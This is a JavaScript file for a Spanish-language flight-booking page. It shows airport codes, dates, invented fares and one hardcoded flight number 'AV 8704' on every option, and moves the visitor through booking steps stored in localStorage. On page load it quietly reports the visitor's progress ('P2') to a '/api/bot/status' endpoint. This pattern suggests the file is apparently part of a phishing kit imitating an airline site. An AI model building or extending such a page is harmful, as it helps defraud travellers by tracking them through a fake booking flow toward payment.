/**
 * SET DOM
 * 
 */
const modal = document.querySelector('#modal-select-ticket');
const flightTimeLabel1 = document.querySelector('#flightTimeLabel1');
const flightTimeLabel2 = document.querySelector('#flightTimeLabel2');
const flightTimeLabel3 = document.querySelector('#flightTimeLabel3');
const flightTimeRange1 = document.querySelector('#flightTimeRange1');
const flightTimeRange2 = document.querySelector('#flightTimeRange2');
const flightTimeRange3 = document.querySelector('#flightTimeRange3');

const loader = document.querySelector('.loader');
setTimeout(() =>{
    try{
        document.querySelector('body').classList.remove('sb-hidden');
        loader.classList.remove('show');

        // if(info.edit === 1){
        //     btnSearchFlight.click();
        // }
        console.log("Index ON")
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify({message: 'P2'})
        })
    }catch(err){
        console.log(err);
    }
}, 2500);

const closeModalTicket = document.querySelector('#modal-close-ticket');
closeModalTicket.addEventListener('click', () =>{
    try{
        modal.classList.remove('show');
    }catch(e){
        console.log(e);
    }
});


const weight = Math.abs(info.flightInfo.origin.weight - info.flightInfo.destination.weight)
const price = (weight * PRECIO_BASE_INT);


/* --- HEADER --- */
document.querySelector('#origin-code').textContent = info.flightInfo.origin.code;
document.querySelector('#destination-code').textContent = info.flightInfo.destination.code;
document.querySelector('#flight-date').textContent = monthDic[info.flightInfo.flightDates[0].split('-')[1] - 1] + ' ' +info.flightInfo.flightDates[0].split('-')[2];
document.querySelector('#flight-label-1').textContent = `Selecciona tu vuelo de salida - ${formatDateType1(info.flightInfo.flightDates[0])}`;
document.querySelector('#flight-label-2').textContent = `${info.flightInfo.origin.city} a ${info.flightInfo.destination.city}`;
document.querySelector('#flight-label-3').textContent = `${formatDateType1(info.flightInfo.flightDates[0])}`;


/* --- FLIGHT CARDS --- */
if(info.flightInfo.origin.country === 'Colombia' && info.flightInfo.destination.country === 'Colombia'){
    document.querySelector('#flight-price-0').textContent = formatPrice(pricesNAC.sched1.basic);
    document.querySelector('#flight-price-1').textContent = formatPrice(pricesNAC.sched1.basic);
    document.querySelector('#flight-price-2').textContent = formatPrice(pricesNAC.sched2.basic);
    document.querySelector('#flight-price-3').textContent = formatPrice(pricesNAC.sched3.basic);
}else{
    document.querySelector('#flight-price-0').textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched1);
    document.querySelector('#flight-price-1').textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched1);
    document.querySelector('#flight-price-2').textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched2);
    document.querySelector('#flight-price-3').textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched3);
      

    const hoursToAdd = weight * MULTIPLICADOR_HORA_VUELO;
    const date1 = calculateTimeDifference(new Date(2024, 1, 1, 3, 33, 0, 0), hoursToAdd + .1);
    const date2 = calculateTimeDifference(new Date(2024, 1, 1, 11, 2, 0, 0), hoursToAdd + .3);
    const date3 = calculateTimeDifference(new Date(2024, 1, 1, 20, 54, 0, 0), hoursToAdd + .2 );

    flightTimeLabel1.textContent = `Directo • ${date1.timeDifference} • AV 8704`;
    flightTimeRange1.innerHTML = `
        <h4>${date1.initialTime}</h4>
        <hr>
        <h4>${date1.finalTime}</h4>
    `;
    flightTimeLabel2.textContent = `Directo • ${date2.timeDifference} • AV 8704`;
    flightTimeRange2.innerHTML = `
        <h4>${date2.initialTime}</h4>
        <hr>
        <h4>${date2.finalTime}</h4>
    `;
    flightTimeLabel3.textContent = `Directo • ${date3.timeDifference} • AV 8704`;
    flightTimeRange3.innerHTML = `
        <h4>${date3.initialTime}</h4>
        <hr>
        <h4>${date3.finalTime}</h4>
    `;
}







/**
 * BUTTONS
 * 
 */
const btnEditFlight = document.querySelector('#btn-edit-flight');
btnEditFlight.addEventListener('click', ()=>{
    info.edit = 1;
    updateLS();
    window.location.href = 'index.html';
});









/**
 * FUNCTIONS
 * 
 */
function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

function formatDateType1(date){
    let format = new Date(parseInt(date.split('-')[0]), parseInt(date.split('-')[1]) - 1, parseInt(date.split('-')[2]) - 1);
    return dayDic[format.getDay()] + ', ' + monthDic[format.getMonth()] + ' ' + date.split('-')[2];
}

function formatPrice(number){
    return number.toLocaleString('es', {
        maximumFractionDigits: 0,
        useGrouping: true
    });
}

function calculateTimeDifference(initialDate, hoursToAdd) {
    // Función para formatear la fecha en 'HH:mm'
    function formatTime(date) {
      let hours = date.getHours().toString().padStart(2, '0');
      let minutes = date.getMinutes().toString().padStart(2, '0');
      return `${hours}:${minutes}`;
    }
  
    // Formatear la hora inicial
    let initialTimeFormatted = formatTime(initialDate);
  
    // Sumar las horas al objeto Date
    let finalDate = new Date(initialDate.getTime() + hoursToAdd * 60 * 60 * 1000);
  
    // Formatear la hora final
    let finalTimeFormatted = formatTime(finalDate);
  
    // Encontrar la diferencia de tiempo entre la hora inicial y la hora final
    let differenceInMilliseconds = finalDate - initialDate;
    let differenceInMinutes = Math.floor(differenceInMilliseconds / (1000 * 60));
    let hours = Math.floor(differenceInMinutes / 60);
    let minutes = differenceInMinutes % 60;
  
    // Formatear la diferencia de tiempo
    let formattedDifference = `${hours}h ${minutes}m`;
  
    // Devolver el objeto con los resultados
    return {
      initialTime: initialTimeFormatted,
      finalTime: finalTimeFormatted,
      timeDifference: formattedDifference
    };
}

function loadFlight(flight_sched){
    //Open modal
    try{
        modal.classList.add('show');
    }catch(err){
        console.log(err);
    }

    info.flightInfo.ticket_sched = flight_sched;
    updateLS();

    const xsPrice = document.querySelector('#xs');
    const sPrice = document.querySelector('#s');
    const mPrice = document.querySelector('#m');
    if(info.flightInfo.origin.country === 'Colombia' && info.flightInfo.destination.country === 'Colombia'){
        // Set type
        info.flightInfo.ticket_nat = 'NAC';
        updateLS();

        if(flight_sched === 'sched1'){
            xsPrice.textContent = formatPrice(pricesNAC.sched1.basic)
            sPrice.textContent = formatPrice(pricesNAC.sched1.classic)
            mPrice.textContent = formatPrice(pricesNAC.sched1.flex)
        }else if(flight_sched === 'sched2'){
            xsPrice.textContent = formatPrice(pricesNAC.sched2.basic)
            sPrice.textContent = formatPrice(pricesNAC.sched2.classic)
            mPrice.textContent = formatPrice(pricesNAC.sched2.flex)
        }else if(flight_sched === 'sched3'){
            xsPrice.textContent = formatPrice(pricesNAC.sched3.basic)
            sPrice.textContent = formatPrice(pricesNAC.sched3.classic)
            mPrice.textContent = formatPrice(pricesNAC.sched3.flex)
        }
    }else{
        // Set type
        info.flightInfo.ticket_nat = 'INT';
        updateLS();

        if(flight_sched === 'sched1'){
            xsPrice.textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched1 * MULTIPLICADOR_PLAN.basic)
            sPrice.textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched1 * MULTIPLICADOR_PLAN.classic)
            mPrice.textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched1 * MULTIPLICADOR_PLAN.flex)
        }else if(flight_sched === 'sched2'){
            xsPrice.textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched2 * MULTIPLICADOR_PLAN.basic)
            sPrice.textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched2 * MULTIPLICADOR_PLAN.classic)
            mPrice.textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched2 * MULTIPLICADOR_PLAN.flex)
        }else if(flight_sched === 'sched3'){
            xsPrice.textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched3 * MULTIPLICADOR_PLAN.basic)
            sPrice.textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched3 * MULTIPLICADOR_PLAN.classic)
            mPrice.textContent = formatPrice(price * MULTIPLICADOR_HORARIO.sched3 * MULTIPLICADOR_PLAN.flex)
        }
    }
}

function nextStep(type){
    info.flightInfo.ticket_type = type;
    updateLS();
    if(info.flightInfo.type === 1){
        window.location.href = 'flight-detail-back.html';
    }else{
        window.location.href = 'step-two.html';
    }
    
}